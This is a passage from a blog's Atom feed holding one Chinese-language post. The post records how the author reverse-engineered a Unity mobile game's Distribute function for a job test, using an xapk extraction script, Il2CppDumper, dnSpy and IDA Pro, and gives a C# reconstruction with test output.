<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>starrysky</title>
  
  <subtitle>starrysky&#39;s zone</subtitle>
  <link href="https://starrysky1004.github.io/atom.xml" rel="self"/>
  
  <link href="https://starrysky1004.github.io/"/>
  <updated>2025-12-28T14:48:45.710Z</updated>
  <id>https://starrysky1004.github.io/</id>
  
  <author>
    <name>starrysky</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Unity逆向</title>
    <link href="https://starrysky1004.github.io/2025/12/28/unity-ni-xiang/unity-ni-xiang/"/>
    <id>https://starrysky1004.github.io/2025/12/28/unity-ni-xiang/unity-ni-xiang/</id>
    <published>2025-12-28T14:27:29.000Z</published>
    <updated>2025-12-28T14:48:45.710Z</updated>
    
    <content type="html"><![CDATA[<p>前两天投的一家公司测试题就是 Unity 逆向，现学了一下做一些记录</p><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><p>题目描述：一个标准的unity游戏，请使用c#等价还原 libil2cpp 中地址为 0x2434EAC 的函数。还原的代码可以正常编译。</p><p>文件类型：xapk</p><p>游戏详情：在 Google Play 找到了这款游戏，游戏规则是每次放置一堆可能存在不同颜色的六边形，当相邻堆的六边形顶部颜色相同时将翻转相同颜色的部分合并成一堆，当一堆中相同颜色的六边形达到一定数量会消除（本来还挺想玩的，结果我谷歌账号竟然玩不了？！</p><p><img src="/2025/12/28/Unity%E9%80%86%E5%90%91/Unity%E9%80%86%E5%90%91/image-20251226233445469.png" alt="image-20251226233445469"></p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><h3 id="提取-apk"><a href="#提取-apk" class="headerlink" title="提取 apk"></a>提取 apk</h3><p>提取脚本如下</p><pre class="line-numbers language-none"><code class="language-none">import osimport zipfileimport shutil# 原始文件名：例如PA01-0018-com.nra.flyermaker-90.xapk# 希望从中解压并提取出主apk：com.nra.flyermaker.apk# 并将com.nra.flyermaker.apk命名为PA01-0018-com.nra.flyermaker-90.apk# 获取当前目录下所有.xapk文件xapk_files &#x3D; [file for file in os.listdir(&#39;.&#39;) if file.endswith(&#39;.xapk&#39;)]# 循环处理每个文件for file in xapk_files:    print(file)    # PA01-0018-com.nra.flyermaker-90.xapk    # 解压缩到当前目录下的与文件同名的文件夹中    with zipfile.ZipFile(file, &#39;r&#39;) as zip_ref:        folder_name &#x3D; os.path.splitext(file)[0]        zip_ref.extractall(folder_name)    # 在解压缩后的文件夹中找到apk文件并进行重命名    folder_files &#x3D; os.listdir(folder_name)    apk_files &#x3D; [name for name in folder_files if name.endswith(&#39;.apk&#39;)]    for apk_file in apk_files:        # 找到解压后的主apk        if os.path.splitext(apk_file)[0] in os.path.splitext(file)[0]:            print(apk_file)              # com.nra.flyermaker.apk            apk_path &#x3D; os.path.join(folder_name, apk_file)            print(&quot;old apk name : &quot; + apk_path)             # old apk name : PA01-0018-com.nra.flyermaker-90&#x2F;com.nra.flyermaker.apk            new_apk_path &#x3D; os.path.join(folder_name, folder_name+&#39;.apk&#39;)            print(&quot;new apk name : &quot; + new_apk_path)             # new apk name : PA01-0018-com.nra.flyermaker-90&#x2F;PA01-0018-com.nra.flyermaker-90.apk            os.rename(apk_path, new_apk_path)            # 将.&#x2F;PA01-0018-com.nra.flyermaker-90&#x2F;PA01-0018-com.nra.flyermaker-90.apk 移动至 .&#x2F;PA01-0018-com.nra.flyermaker-90.apk            shutil.move(new_apk_path, &quot;.&#x2F;&quot;+folder_name+&#39;.apk&#39;)            # 删除.&#x2F;PA01-0018-com.nra.flyermaker-90&#x2F;文件夹            shutil.rmtree(folder_name)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提取结果：</p><p><img src="/2025/12/28/Unity%E9%80%86%E5%90%91/Unity%E9%80%86%E5%90%91/image-20251226213254223.png" alt="image-20251226213254223"></p><h3 id="反编译-apk"><a href="#反编译-apk" class="headerlink" title="反编译 apk"></a>反编译 apk</h3><p>使用 Android Killer 对 config.arm64_v8a.apk 进行反编译，找到 libil2cpp.so，路径：config.arm64_v8a\Project\lib\arm64-v8a\libil2cpp.so</p><p><img src="/2025/12/28/Unity%E9%80%86%E5%90%91/Unity%E9%80%86%E5%90%91/image-20251226213631601.png" alt="image-20251226213631601"></p><p>使用 Android Killer 对 com.gamebrain.hexasort 进行反编译，得到 global-metadata.dat，路径：com.gamebrain.hexasort\Project\assets\bin\Data\Managed\Metadata\global-metadata.dat</p><p><img src="/2025/12/28/Unity%E9%80%86%E5%90%91/Unity%E9%80%86%E5%90%91/image-20251226220845770.png" alt="image-20251226220845770"></p><h3 id="dump-il2cpp-隐藏文件"><a href="#dump-il2cpp-隐藏文件" class="headerlink" title="dump il2cpp 隐藏文件"></a>dump il2cpp 隐藏文件</h3><p>将 global-metadata.dat 和 libil2cpp.so 放到同一个文件夹，使用 Il2CppDumper 进行 dump</p><p>运行 Il2CppDump 依次选择 libil2cpp.so 和 global-metadata.dat，得到隐藏文件，通过 script.json 和 il2cpp.h 可以恢复符号表</p><p><img src="/2025/12/28/Unity%E9%80%86%E5%90%91/Unity%E9%80%86%E5%90%91/image-20251226224820362.png" alt="image-20251226224820362"></p><p>查看 dump.cs 搜索地址 0x2434EAC，获取到需要逆向的函数名为 Distribute</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token comment">// RVA: 0x2434EAC Offset: 0x2433EAC VA: 0x2434EAC</span><span class="token keyword">private</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Distribute</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">bool</span></span> reset<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2025/12/28/Unity%E9%80%86%E5%90%91/Unity%E9%80%86%E5%90%91/image-20251226231409464.png" alt="image-20251226231409464"></p><p>DummyDll 中含有 Assembly-CSharp.dll</p><p><img src="/2025/12/28/Unity%E9%80%86%E5%90%91/Unity%E9%80%86%E5%90%91/image-20251226230703924.png" alt="image-20251226230703924"></p><p>使用 dnSpy 打开 Assembly-CSharp.dll 定位到 Distribute 函数（VA &#x3D; 0x2434EAC），发现函数位于 Gameplay&#x2F;Cell，虽然 dnSpy 里没有具体的反编译代码，但根据含有的函数可以判断 Cell 类的作用是控制单个单元格，包括状态（锁定、解锁…）、增删合并、响应动画交互等</p><p><img src="/2025/12/28/Unity%E9%80%86%E5%90%91/Unity%E9%80%86%E5%90%91/image-20251226232638465.png" alt="image-20251226232638465"></p><h3 id="反编译-so"><a href="#反编译-so" class="headerlink" title="反编译 so"></a>反编译 so</h3><p>使用 IDA Pro 反编译 libil2cpp.so 。IDA 加载了半小时…</p><p><img src="/2025/12/28/Unity%E9%80%86%E5%90%91/Unity%E9%80%86%E5%90%91/image-20251226225729972.png" alt="image-20251226225729972"></p><h3 id="恢复符号表"><a href="#恢复符号表" class="headerlink" title="恢复符号表"></a>恢复符号表</h3><p>IDAPro 导入 Il2CppDumper 的 ida_with_struct_py3，选择 script.json 和 il2cpp.h 即可恢复符号表</p><p><img src="/2025/12/28/Unity%E9%80%86%E5%90%91/Unity%E9%80%86%E5%90%91/image-20251227005851138.png" alt="image-20251227005851138"></p><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>跳转到 0x2434EAC 看到恢复符号表的函数 Gameplay_Cell__Distribute，作用是将格子上堆叠的六边形方块按照颜色连续性进行分段分组</p><p><img src="/2025/12/28/Unity%E9%80%86%E5%90%91/Unity%E9%80%86%E5%90%91/image-20251227022236175.png" alt="image-20251227022236175"></p><p><img src="/2025/12/28/Unity%E9%80%86%E5%90%91/Unity%E9%80%86%E5%90%91/image-20251227022250254.png" alt="image-20251227022250254"></p><p><img src="/2025/12/28/Unity%E9%80%86%E5%90%91/Unity%E9%80%86%E5%90%91/image-20251227022301493.png" alt="image-20251227022301493"></p><p><img src="/2025/12/28/Unity%E9%80%86%E5%90%91/Unity%E9%80%86%E5%90%91/image-20251227022313208.png" alt="image-20251227022313208"></p><h2 id="C-等价还原"><a href="#C-等价还原" class="headerlink" title="C# 等价还原"></a>C# 等价还原</h2><p>没学过 C#… AI 就是生产力 yeah</p><p>代码如下</p><pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">using System;using System.Collections.Generic;namespace HexaSort.Gameplay&#123;    &#x2F;&#x2F;&#x2F; &lt;summary&gt;    &#x2F;&#x2F;&#x2F; 六边形方块的颜色类型枚举    &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;    public enum HexType    &#123;        None &#x3D; 0,        Red &#x3D; 1,        Blue &#x3D; 2,        Green &#x3D; 3,        Yellow &#x3D; 4,        Purple &#x3D; 5,        Orange &#x3D; 6,        Cyan &#x3D; 7,        Pink &#x3D; 8    &#125;    &#x2F;&#x2F;&#x2F; &lt;summary&gt;    &#x2F;&#x2F;&#x2F; 六边形方块类    &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;    public class Block    &#123;        &#x2F;&#x2F;&#x2F; &lt;summary&gt;        &#x2F;&#x2F;&#x2F; 方块的颜色类型        &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;        public HexType Type &#123; get; set; &#125;        &#x2F;&#x2F;&#x2F; &lt;summary&gt;        &#x2F;&#x2F;&#x2F; 方块的位置索引        &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;        public int Index &#123; get; set; &#125;        &#x2F;&#x2F;&#x2F; &lt;summary&gt;        &#x2F;&#x2F;&#x2F; 方块所属的格子（可为空，方块未放置时为null）        &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;        public Cell? ParentCell &#123; get; set; &#125;        public Block()        &#123;            Type &#x3D; HexType.None;            ParentCell &#x3D; null;        &#125;        public Block(HexType type)        &#123;            Type &#x3D; type;            ParentCell &#x3D; null;        &#125;    &#125;    &#x2F;&#x2F;&#x2F; &lt;summary&gt;    &#x2F;&#x2F;&#x2F; 游戏格子类 - 用于存放堆叠的六边形方块    &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;    public class Cell    &#123;        &#x2F;&#x2F;&#x2F; &lt;summary&gt;        &#x2F;&#x2F;&#x2F; 该格子上所有堆叠的方块列表        &#x2F;&#x2F;&#x2F; 索引0 &#x3D; 底部方块，索引n-1 &#x3D; 顶部方块        &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;        public List&lt;Block&gt; Blocks &#123; get; private set; &#125;        &#x2F;&#x2F;&#x2F; &lt;summary&gt;        &#x2F;&#x2F;&#x2F; 按颜色连续性分组后的方块列表（缓存）        &#x2F;&#x2F;&#x2F; 索引0 &#x3D; 顶部颜色组，索引n-1 &#x3D; 底部颜色组        &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;        private List&lt;List&lt;Block&gt;&gt;? _distribution;        &#x2F;&#x2F;&#x2F; &lt;summary&gt;        &#x2F;&#x2F;&#x2F; 格子在棋盘上的坐标        &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;        public int Row &#123; get; set; &#125;        public int Column &#123; get; set; &#125;        public Cell()        &#123;            Blocks &#x3D; new List&lt;Block&gt;();            _distribution &#x3D; null;        &#125;        &#x2F;&#x2F;&#x2F; &lt;summary&gt;        &#x2F;&#x2F;&#x2F; 将格子中的方块按颜色连续性进行分组        &#x2F;&#x2F;&#x2F; 从顶部向底部遍历，将连续相同颜色的方块归为一组        &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;        &#x2F;&#x2F;&#x2F; &lt;param name&#x3D;&quot;reset&quot;&gt;是否强制重新计算分组，忽略缓存&lt;&#x2F;param&gt;        public void Distribute(bool reset)        &#123;            &#x2F;&#x2F; 判断是否需要重新计算分组：            &#x2F;&#x2F; 1. _distribution 为空（从未计算过）            &#x2F;&#x2F; 2. _distribution 中没有任何分组            &#x2F;&#x2F; 3. reset 参数为 true（调用者要求强制刷新）            if (_distribution &#x3D;&#x3D; null || _distribution.Count &lt; 1 || reset)            &#123;                &#x2F;&#x2F; 创建新的分组列表                _distribution &#x3D; new List&lt;List&lt;Block&gt;&gt;();                &#x2F;&#x2F; 获取该格子上所有的方块列表                List&lt;Block&gt;? blocksList &#x3D; this.Blocks;                &#x2F;&#x2F; 如果方块列表为空，直接返回                if (blocksList &#x3D;&#x3D; null)                &#123;                    return;                &#125;                &#x2F;&#x2F; 计算起始索引：从最后一个元素开始（即堆顶方块）                &#x2F;&#x2F; 注意：遍历是从顶部向底部进行的                int currentIndex &#x3D; blocksList.Count - 1;                &#x2F;&#x2F; 如果没有方块，直接返回                if (currentIndex &lt; 0)                &#123;                    return;                &#125;                &#x2F;&#x2F; 记录上一个方块的颜色类型，用于判断颜色是否变化                HexType previousColorType &#x3D; HexType.None;                &#x2F;&#x2F; 当前正在填充的颜色分组                List&lt;Block&gt;? currentColorGroup &#x3D; null;                &#x2F;&#x2F; 从顶部向底部遍历所有方块                do                &#123;                    &#x2F;&#x2F; 获取当前索引位置的方块                    Block? currentBlock &#x3D; blocksList[currentIndex];                    &#x2F;&#x2F; 安全检查：如果方块为空，终止遍历                    if (currentBlock &#x3D;&#x3D; null)                    &#123;                        break;                    &#125;                    &#x2F;&#x2F; 获取当前方块的颜色类型                    HexType currentColorType &#x3D; currentBlock.Type;                    &#x2F;&#x2F; 只处理有效颜色的方块（Type !&#x3D; None）                    if (currentColorType !&#x3D; HexType.None)                    &#123;                        &#x2F;&#x2F; 检查是否需要创建新的颜色分组                        &#x2F;&#x2F; 当前颜色与上一个方块的颜色不同，说明遇到了颜色边界                        if (previousColorType !&#x3D; currentColorType)                        &#123;                            &#x2F;&#x2F; 创建一个新的分组列表                            currentColorGroup &#x3D; new List&lt;Block&gt;();                            &#x2F;&#x2F; 将新分组添加到 _distribution 中                            _distribution.Add(currentColorGroup);                            &#x2F;&#x2F; 更新&quot;上一个颜色&quot;为当前颜色                            previousColorType &#x3D; currentColorType;                        &#125;                        &#x2F;&#x2F; 将当前方块添加到当前颜色分组                        if (currentColorGroup !&#x3D; null)                        &#123;                            currentColorGroup.Add(currentBlock);                        &#125;                    &#125;                    &#x2F;&#x2F; 移动到下一个方块（向底部方向）                    currentIndex--;                &#125; while (currentIndex &gt;&#x3D; 0 &amp;&amp; blocksList !&#x3D; null);            &#125;            &#x2F;&#x2F; 如果不需要重新计算（distribution有效且reset&#x3D;false），函数直接返回，使用缓存的结果        &#125;        &#x2F;&#x2F;&#x2F; &lt;summary&gt;        &#x2F;&#x2F;&#x2F; 获取顶部颜色组的颜色类型        &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;        &#x2F;&#x2F;&#x2F; &lt;returns&gt;顶部方块的颜色，如果没有方块则返回 HexType.None&lt;&#x2F;returns&gt;        public HexType GetTopType()        &#123;            &#x2F;&#x2F; 确保分组已计算            Distribute(false);            &#x2F;&#x2F; 检查分组是否有效            if (_distribution &#x3D;&#x3D; null || _distribution.Count &lt; 1)            &#123;                return HexType.None;            &#125;            &#x2F;&#x2F; 获取第一个分组（顶部颜色组）            List&lt;Block&gt;? topGroup &#x3D; _distribution[0];            if (topGroup &#x3D;&#x3D; null || topGroup.Count &lt; 1)            &#123;                return HexType.None;            &#125;            &#x2F;&#x2F; 返回顶部分组第一个方块的颜色            return topGroup[0].Type;        &#125;        &#x2F;&#x2F;&#x2F; &lt;summary&gt;        &#x2F;&#x2F;&#x2F; 获取第二层颜色组的颜色类型        &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;        &#x2F;&#x2F;&#x2F; &lt;returns&gt;第二层方块的颜色，如果不存在则返回 HexType.None&lt;&#x2F;returns&gt;        public HexType GetSecondType()        &#123;            &#x2F;&#x2F; 确保分组已计算            Distribute(false);            &#x2F;&#x2F; 检查是否有至少两个分组            if (_distribution &#x3D;&#x3D; null || _distribution.Count &lt; 2)            &#123;                return HexType.None;            &#125;            &#x2F;&#x2F; 获取第二个分组            List&lt;Block&gt;? secondGroup &#x3D; _distribution[1];            if (secondGroup &#x3D;&#x3D; null || secondGroup.Count &lt; 1)            &#123;                return HexType.None;            &#125;            &#x2F;&#x2F; 返回第二分组第一个方块的颜色            return secondGroup[0].Type;        &#125;        &#x2F;&#x2F;&#x2F; &lt;summary&gt;        &#x2F;&#x2F;&#x2F; 获取所有颜色分组的类型和数量信息        &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;        &#x2F;&#x2F;&#x2F; &lt;returns&gt;包含每个分组的 (颜色类型, 方块数量) 元组列表&lt;&#x2F;returns&gt;        public List&lt;(HexType ColorType, int Count)&gt; GetTypes()        &#123;            &#x2F;&#x2F; 确保分组已计算            Distribute(false);            var result &#x3D; new List&lt;(HexType, int)&gt;();            if (_distribution &#x3D;&#x3D; null)            &#123;                return result;            &#125;            &#x2F;&#x2F; 遍历每个颜色分组，提取颜色和数量            foreach (var group in _distribution)            &#123;                if (group !&#x3D; null &amp;&amp; group.Count &gt; 0)                &#123;                    result.Add((group[0].Type, group.Count));                &#125;            &#125;            return result;        &#125;        &#x2F;&#x2F;&#x2F; &lt;summary&gt;        &#x2F;&#x2F;&#x2F; 获取顶部颜色组的方块列表        &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;        &#x2F;&#x2F;&#x2F; &lt;returns&gt;顶部颜色组的方块列表，如果不存在则返回 null&lt;&#x2F;returns&gt;        public List&lt;Block&gt;? GetTopGroup()        &#123;            Distribute(false);            if (_distribution &#x3D;&#x3D; null || _distribution.Count &lt; 1)            &#123;                return null;            &#125;            return _distribution[0];        &#125;        &#x2F;&#x2F;&#x2F; &lt;summary&gt;        &#x2F;&#x2F;&#x2F; 获取顶部颜色组的方块数量        &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;        &#x2F;&#x2F;&#x2F; &lt;returns&gt;顶部颜色组的方块数量&lt;&#x2F;returns&gt;        public int GetTopGroupCount()        &#123;            var topGroup &#x3D; GetTopGroup();            return topGroup?.Count ?? 0;        &#125;        &#x2F;&#x2F;&#x2F; &lt;summary&gt;        &#x2F;&#x2F;&#x2F; 获取分组总数        &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;        &#x2F;&#x2F;&#x2F; &lt;returns&gt;颜色分组的数量&lt;&#x2F;returns&gt;        public int GetDistributionCount()        &#123;            Distribute(false);            return _distribution?.Count ?? 0;        &#125;        &#x2F;&#x2F;&#x2F; &lt;summary&gt;        &#x2F;&#x2F;&#x2F; 添加方块到格子顶部        &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;        &#x2F;&#x2F;&#x2F; &lt;param name&#x3D;&quot;block&quot;&gt;要添加的方块&lt;&#x2F;param&gt;        public void AddBlock(Block block)        &#123;            if (block &#x3D;&#x3D; null)            &#123;                return;            &#125;            block.ParentCell &#x3D; this;            block.Index &#x3D; Blocks.Count;            Blocks.Add(block);            &#x2F;&#x2F; 标记分组缓存失效，下次访问时重新计算            InvalidateDistribution();        &#125;        &#x2F;&#x2F;&#x2F; &lt;summary&gt;        &#x2F;&#x2F;&#x2F; 从格子顶部移除指定数量的方块        &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;        &#x2F;&#x2F;&#x2F; &lt;param name&#x3D;&quot;count&quot;&gt;要移除的方块数量&lt;&#x2F;param&gt;        &#x2F;&#x2F;&#x2F; &lt;returns&gt;被移除的方块列表&lt;&#x2F;returns&gt;        public List&lt;Block&gt; RemoveBlocksFromTop(int count)        &#123;            var removedBlocks &#x3D; new List&lt;Block&gt;();            int actualCount &#x3D; Math.Min(count, Blocks.Count);            for (int i &#x3D; 0; i &lt; actualCount; i++)            &#123;                int topIndex &#x3D; Blocks.Count - 1;                if (topIndex &gt;&#x3D; 0)                &#123;                    Block block &#x3D; Blocks[topIndex];                    Blocks.RemoveAt(topIndex);                    block.ParentCell &#x3D; null;                    removedBlocks.Add(block);                &#125;            &#125;            &#x2F;&#x2F; 标记分组缓存失效            InvalidateDistribution();            return removedBlocks;        &#125;        &#x2F;&#x2F;&#x2F; &lt;summary&gt;        &#x2F;&#x2F;&#x2F; 移除顶部颜色组的所有方块        &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;        &#x2F;&#x2F;&#x2F; &lt;returns&gt;被移除的方块列表&lt;&#x2F;returns&gt;        public List&lt;Block&gt; RemoveTopGroup()        &#123;            var topGroup &#x3D; GetTopGroup();            if (topGroup &#x3D;&#x3D; null || topGroup.Count &#x3D;&#x3D; 0)            &#123;                return new List&lt;Block&gt;();            &#125;            return RemoveBlocksFromTop(topGroup.Count);        &#125;        &#x2F;&#x2F;&#x2F; &lt;summary&gt;        &#x2F;&#x2F;&#x2F; 使分组缓存失效，下次访问时将重新计算        &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;        public void InvalidateDistribution()        &#123;            _distribution &#x3D; null;        &#125;        &#x2F;&#x2F;&#x2F; &lt;summary&gt;        &#x2F;&#x2F;&#x2F; 清空格子上的所有方块        &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;        public void Clear()        &#123;            foreach (var block in Blocks)            &#123;                if (block !&#x3D; null)                &#123;                    block.ParentCell &#x3D; null;                &#125;            &#125;            Blocks.Clear();            InvalidateDistribution();        &#125;        &#x2F;&#x2F;&#x2F; &lt;summary&gt;        &#x2F;&#x2F;&#x2F; 获取格子上的方块总数        &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;        public int BlockCount &#x3D;&gt; Blocks?.Count ?? 0;        &#x2F;&#x2F;&#x2F; &lt;summary&gt;        &#x2F;&#x2F;&#x2F; 检查格子是否为空        &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;        public bool IsEmpty &#x3D;&gt; BlockCount &#x3D;&#x3D; 0;    &#125;    &#x2F;&#x2F;&#x2F; &lt;summary&gt;    &#x2F;&#x2F;&#x2F; 测试程序入口    &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;    public class Program    &#123;        public static void Main(string[] args)        &#123;            Console.WriteLine(&quot;&#x3D;&#x3D;&#x3D; HexaSort Distribute 函数测试 &#x3D;&#x3D;&#x3D;\n&quot;);            &#x2F;&#x2F; 创建测试格子            var cell &#x3D; new Cell();            &#x2F;&#x2F; 添加方块（从底到顶：红、红、蓝、蓝、蓝、红）            Console.WriteLine(&quot;添加方块序列（从底到顶）：红、红、蓝、蓝、蓝、红&quot;);            cell.AddBlock(new Block(HexType.Red));   &#x2F;&#x2F; 索引 0（底部）            cell.AddBlock(new Block(HexType.Red));   &#x2F;&#x2F; 索引 1            cell.AddBlock(new Block(HexType.Blue));  &#x2F;&#x2F; 索引 2            cell.AddBlock(new Block(HexType.Blue));  &#x2F;&#x2F; 索引 3            cell.AddBlock(new Block(HexType.Blue));  &#x2F;&#x2F; 索引 4            cell.AddBlock(new Block(HexType.Red));   &#x2F;&#x2F; 索引 5（顶部）            Console.WriteLine($&quot;\n方块总数: &#123;cell.BlockCount&#125;&quot;);            &#x2F;&#x2F; 测试 Distribute            Console.WriteLine(&quot;\n--- 执行 Distribute(false) ---&quot;);            cell.Distribute(false);            &#x2F;&#x2F; 测试 GetTopType            HexType topType &#x3D; cell.GetTopType();            Console.WriteLine($&quot;顶部颜色 (GetTopType): &#123;topType&#125;&quot;);            &#x2F;&#x2F; 测试 GetSecondType            HexType secondType &#x3D; cell.GetSecondType();            Console.WriteLine($&quot;第二层颜色 (GetSecondType): &#123;secondType&#125;&quot;);            &#x2F;&#x2F; 测试 GetTypes            Console.WriteLine(&quot;\n--- 所有颜色分组 (GetTypes) ---&quot;);            var types &#x3D; cell.GetTypes();            for (int i &#x3D; 0; i &lt; types.Count; i++)            &#123;                Console.WriteLine($&quot;  分组[&#123;i&#125;]: 颜色&#x3D;&#123;types[i].ColorType&#125;, 数量&#x3D;&#123;types[i].Count&#125;&quot;);            &#125;            &#x2F;&#x2F; 测试 GetTopGroupCount            Console.WriteLine($&quot;\n顶部分组方块数: &#123;cell.GetTopGroupCount()&#125;&quot;);            Console.WriteLine($&quot;分组总数: &#123;cell.GetDistributionCount()&#125;&quot;);            &#x2F;&#x2F; 测试移除顶部分组            Console.WriteLine(&quot;\n--- 移除顶部颜色组 ---&quot;);            var removed &#x3D; cell.RemoveTopGroup();            Console.WriteLine($&quot;移除了 &#123;removed.Count&#125; 个方块&quot;);            &#x2F;&#x2F; 再次查看分组            Console.WriteLine(&quot;\n--- 移除后的分组 ---&quot;);            types &#x3D; cell.GetTypes();            for (int i &#x3D; 0; i &lt; types.Count; i++)            &#123;                Console.WriteLine($&quot;  分组[&#123;i&#125;]: 颜色&#x3D;&#123;types[i].ColorType&#125;, 数量&#x3D;&#123;types[i].Count&#125;&quot;);            &#125;            Console.WriteLine($&quot;\n当前顶部颜色: &#123;cell.GetTopType()&#125;&quot;);            Console.WriteLine($&quot;剩余方块数: &#123;cell.BlockCount&#125;&quot;);            Console.WriteLine(&quot;\n&#x3D;&#x3D;&#x3D; 测试完成 &#x3D;&#x3D;&#x3D;&quot;);        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译通过，运行结果如下：</p><p><img src="/2025/12/28/Unity%E9%80%86%E5%90%91/Unity%E9%80%86%E5%90%91/image-20251227025203889.png" alt="image-20251227025203889"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>xapk2spk：<a href="https://blog.csdn.net/qq_39441603/article/details/130329745">https://blog.csdn.net/qq_39441603/article/details/130329745</a></p><p>apk反编译与dump隐藏文件：<a 